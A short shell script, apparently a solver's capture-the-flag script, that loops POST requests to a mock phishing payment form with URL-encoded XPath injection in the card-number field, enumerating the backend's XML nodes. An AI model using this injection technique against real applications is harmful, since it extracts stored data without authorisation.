#!/bin/sh
for i in `seq 138`; do
	echo -n "$i"
	curl 'http://really.sneaky.phishing.thecatch.cz/' -s -X POST --data-raw "card-holder-name=XX&card-number=%2F*%5B1%5D%2F*%5B$i%5D%2F*%5B1%5D&card-expires-date=11%2F2022&card-cvv=111&proceed-to-pay=" | grep "This card"
done
